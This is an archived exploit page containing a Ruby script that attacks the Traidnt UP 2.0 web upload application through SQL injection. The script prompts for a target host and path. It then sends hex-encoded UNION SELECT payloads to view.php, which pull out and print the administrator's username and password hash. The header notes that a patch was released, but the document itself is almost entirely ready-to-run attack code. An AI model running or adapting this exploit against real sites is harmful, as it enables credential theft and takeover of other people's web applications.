<html><head><title>Traidnt UP 2.0 Remote SQL Injection Exploit</title></head><pre>#!/usr/bin/ruby

#=============================================#
#          Traidnt UP v2.0 Exploit            #
#         SQL Injection Vulnerability         #
#---------------------------------------------#
# Date: 05-08-2009                            #
# Discovered &amp; written by: Jafer Al-Zidjali   #
# Email: jafer[at]scorpionds.com              #
# Website: www.scorpionds.com                 #
#---------------------------------------------#
# Conditions:                                 #
#            1. magic_quotes_gpc=OFF          #
# Notes:                                      #
#       1. Author has been notified           #
#       2. A public patch has been released   #
#=============================================#

require &quot;net/http&quot;
require &quot;base64&quot;

intro=[
          &quot;+=============================================+&quot;,
          &quot;+          Traidnt UP v2.0 Exploit            +&quot;,
          &quot;+        SQL Injection Vulnerability          +&quot;,
          &quot;+  Discovered &amp; written by: Jafer Al-Zidjali  +&quot;,
          &quot;+         Email: jafer[at]scorpionds.com         +&quot;,
          &quot;+         Website: www.scorpionds.com         +&quot;,
          &quot;+=============================================+&quot;
          ]

def print_intro text
  w=&quot;|&quot;
  text.each do |str|
    str.scan(/./) do |c|
        STDOUT.flush
      if w==&quot;|&quot; 
        print &quot;\b&quot;+c +w
        w=&quot;/&quot;
      elsif w==&quot;/&quot; 
        print &quot;\b&quot;+c +w
        w=&quot;-&quot;  
      elsif w==&quot;-&quot; 
        print &quot;\b&quot;+c +w
        w=&quot;\\&quot; 
      else
      print &quot;\b&quot;+c +w
      w=&quot;|&quot;
      end
      sleep 0.05
    end
    
    print &quot;\b &quot;
    puts &quot;&quot;
  end
end

print_intro intro

puts &quot;\nEnter host name (e.g. example.com):&quot;
host=gets.chomp

puts &quot;\nEnter script path (e.g. /upload/):&quot;
path=gets.chomp


puts &quot;\nPress any key to continue...&quot;
opt=gets.chomp
begin
shellcode=
&quot;\x76\x69\x65\x77\x2e\x70\x68\x70\x3f\x66\x69\x6c\x65\x3d\x62\x6c\x61\x68\x62\x6c&quot;+
&quot;\x61\x68\x27\x2b\x75\x6e\x69\x6f\x6e\x2b\x73\x65\x6c\x65\x63\x74\x2b\x31\x2c\x63&quot;+
&quot;\x6f\x6e\x63\x61\x74\x28\x27\x53\x54\x41\x52\x54\x27\x2c\x61\x64\x6d\x69\x6e\x5f&quot;+
&quot;\x75\x73\x65\x72\x2c\x27\x45\x4e\x44\x27\x29\x2c\x33\x2c\x34\x2c\x35\x2c\x36\x2c&quot;+
&quot;\x37\x2c\x38\x2c\x39\x2c\x30\x2b\x66\x72\x6f\x6d\x2b\x61\x64\x6d\x69\x6e\x2b\x77&quot;+
&quot;\x68\x65\x72\x65\x2b\x61\x64\x6d\x69\x6e\x5f\x69\x64\x3d\x27\x31&quot;

http = Net::HTTP.new(host, 80)
resp= http.get(path+shellcode)
puts &quot;Username: &quot;+(/START(.+)END/).match(resp.body)[1]

shellcode=
&quot;\x76\x69\x65\x77\x2e\x70\x68\x70\x3f\x66\x69\x6c\x65\x3d\x62\x6c\x61\x68\x62\x6c&quot;+
&quot;\x61\x68\x27\x2b\x75\x6e\x69\x6f\x6e\x2b\x73\x65\x6c\x65\x63\x74\x2b\x31\x2c\x63&quot;+
&quot;\x6f\x6e\x63\x61\x74\x28\x27\x53\x54\x41\x52\x54\x27\x2c\x61\x64\x6d\x69\x6e\x5f&quot;+
&quot;\x70\x61\x73\x73\x77\x6f\x72\x64\x2c\x27\x45\x4e\x44\x27\x29\x2c\x33\x2c\x34\x2c&quot;+
&quot;\x35\x2c\x36\x2c\x37\x2c\x38\x2c\x39\x2c\x30\x2b\x66\x72\x6f\x6d\x2b\x61\x64\x6d&quot;+
&quot;\x69\x6e\x2b\x77\x68\x65\x72\x65\x2b\x61\x64\x6d\x69\x6e\x5f\x69\x64\x3d\x27\x31&quot;

http = Net::HTTP.new(host, 80)
resp= http.get(path+shellcode)
puts &quot;Password Hash: &quot;+(/START(.+)END/).match(resp.body)[1]
rescue
puts &quot;Could not fetch data. magic_quotes_gpc probably is ON.&quot;
end

# milw0rm.com [2009-08-18]</pre></html>